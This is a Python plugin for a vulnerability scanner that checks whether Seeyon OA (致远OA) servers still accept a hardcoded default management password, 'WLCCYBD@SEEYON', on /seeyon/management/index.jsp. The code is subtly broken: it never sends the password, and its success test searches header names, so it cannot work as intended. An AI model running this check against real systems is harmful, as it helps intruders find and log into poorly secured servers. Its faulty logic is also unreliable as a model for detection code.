#coding:utf-8
import requests
import requests.packages.urllib3
requests.packages.urllib3.disable_warnings()
import re
def msg():
  ret = {

      'links'     :  '',

      'huixian'   :  '',

      'method'    :   'post',

      'bugname'   :   '致远OA默认口令',

      'level'     :   'high',

      'FOFA'      :   '',

      'author'    :   'ppxfx',

      'ifbug'     :   False,
  }
  return ret
def run(url,ua):
  ret = msg()
  headers = {
      'User-Agent': ua,
      }
  target = '/seeyon/management/index.jsp'
  data = 'password=WLCCYBD@SEEYON'
  url1 = url + target
  ret['url'] = url1
  try:
    res=requests.get(url=url1,headers=headers,timeout=5,verify=False,allow_redirects=False)
    if res.status_code == 302 and '/seeyon/management/status.jsp' in res.headers:
      ret['huixian'] = data
      res.close()
      ret['ifbug'] = True
      return ret
    else:
      return ret
  except:
    return ret